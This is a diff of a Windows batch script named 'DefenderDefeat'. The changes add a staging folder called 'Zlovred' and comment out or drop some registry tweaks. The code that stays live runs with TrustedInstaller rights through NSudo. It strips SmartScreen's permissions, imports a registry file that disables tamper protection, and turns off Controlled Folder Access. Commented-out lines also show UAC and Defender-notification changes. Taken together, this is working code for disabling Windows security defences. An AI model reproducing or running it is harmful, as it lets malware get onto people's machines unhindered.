@@ -24,6 +24,12 @@ rem Metadata
 set PRODUCT_NAME=DefenderDefeat
 SET FIRM_NAME=NIT
 
+rem set TPDL variable
+rem
+if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
+set TPDL=%TEMP%
+:TPDL_End
+
 rem
 echo Define Folders...
 rem
@@ -78,7 +84,7 @@ if not exist %smartscreen% echo %smartscreen% not present && exit /b 7
 if not exist %wscriptexe% echo %wscriptexe% not present && exit /b 7
 rem  if not exist %REGINI% echo %REGINI% not present && exit /b 7
 
-title Installing Packages 
+title Installing Packages
 ::-------------------------------------
 REM  --> CheckING for permissions
 net session >nul 2>&1
@@ -135,23 +141,19 @@ rem
 %NSUDOEXE% -U:T -ShowWindowMode:Show ^
  icacls "%smartscreen%" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
 
-%NSUDOEXE% -U:T -ShowWindowMode:Show ^
-   %regexe% add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v ^
-   "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
+rem %NSUDOEXE% -U:T -ShowWindowMode:Show ^
+rem    %regexe% add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v ^
+rem   "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
 
-%NSUDOEXE% -U:T -ShowWindowMode:Show ^
-  %regexe% add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v ^
-  "Notification_Suppress" /t REG_DWORD /d "1" /f
- 
+rem %NSUDOEXE% -U:T -ShowWindowMode:Show ^
+rem  %regexe% add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v ^
+rem  "Notification_Suppress" /t REG_DWORD /d "1" /f
+
 %NSUDOEXE% -U:T -ShowWindowMode:Show %regexe% import %LocalFolder%\%DisTamper%
- 
+
 rem rem %NSUDOEXE% -U:T -ShowWindowMode:Hide %bcdeditexe% /set {default} recoveryenabled No
 
 rem rem %NSUDOEXE% -U:T -ShowWindowMode:Hide %bcdeditexe% /set {default} bootstatuspolicy ignoreallfailures
-
-rem rem %powershellexe% -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
-
-rem rem %powershellexe% New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
 
 %powershellexe% -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
 
@@ -173,4 +175,5 @@ goto End
 
 :End
 echo The End of the Script %0
-exit /b 
+exit /b %errstatus1%
+
